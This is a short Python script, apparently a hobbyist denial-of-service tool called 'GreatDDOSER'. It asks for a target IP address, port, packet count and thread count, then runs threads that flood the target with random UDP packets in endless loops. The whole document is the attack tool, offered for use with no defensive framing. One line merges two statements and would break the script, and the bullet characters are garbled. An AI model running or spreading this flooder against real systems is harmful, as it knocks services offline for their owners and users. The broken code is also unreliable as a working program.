import random

import socket

import threading

import os,sys

os.system("clear")

print('''

    GreatDDOSER

///////////////////////////////////////

                                

''')

print("Tools By GreatMan")

ip = str(input("Target IP:"))

port = int(input("Target Port:"))

choice = str(input("Attack? (y/n):"))

times = int(input("Packets :"))

threads = int(input("Threads:"))

os.system("clear")

def run():

	data = random._urandom(900)	i = random.choice(("[â€¢]","[â€¢]","[â€¢]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print(i +" GreatMan The Abuser !!!")

		except:

			print("[X] Attacking!!!")

def run2():

	data = random._urandom(900)

	i = random.choice(("[â€¢]","[â€¢]","[â€¢]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print(i +" GreatMan The Abuser!!!")

		except:

			s.close()

			print("[X] Attacking!!!")

def run3():

	data = random._urandom(16)

	i = random.choice(("[â€¢]","[â€¢]","[â€¢]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print(i +" GreatMan The Abuser !!!")

		except:

			s.close()

			print("[X] Attacking!!!")

for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run2)

		th.start()

	else:

		th = threading.Thread(target = run3)

		th.start()
